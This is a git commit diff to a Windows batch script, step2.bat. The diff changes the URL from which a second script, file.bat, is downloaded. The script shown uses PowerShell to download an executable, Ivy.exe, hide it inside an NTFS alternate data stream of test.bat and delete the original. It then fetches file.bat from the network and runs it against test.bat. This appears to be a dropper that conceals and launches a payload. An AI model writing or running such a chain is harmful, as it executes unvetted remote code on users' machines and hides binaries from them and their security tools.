2b81464177f31aed915e9bfd24fade7431b2d326
roboisaac11 <88291918+roboisaac11@users.noreply.github.com>
2024-04-06 17:01:59 -0700

    Update step2.bat

--- step2.bat
+++ step2.bat
@@ -6,5 +6,5 @@ powershell -Command "Invoke-WebRequest -Uri 'https://github.com/roboisaac11/stur
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/Ivy.exe' -OutFile 'Ivy.exe'"
 powershell -command " & {(Get-Content %CD%\Ivy.exe -Raw | Set-Content %CD%\test.bat -Stream file.exe)}"
 del %CD%\Ivy.exe
-powershell -Command "Invoke-WebRequest -Uri 'https://gist.github.com/roboisaac11/f54f8b182f3fbc2a3a0426e4197d07e5/raw/ff290eb3c98c5a9d1991334da8fd5a4019ea6bc9/file.bat' -OutFile 'file.bat'"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/file.bat' -OutFile 'file.bat'"
 %CD%\file.bat %CD%\test.bat
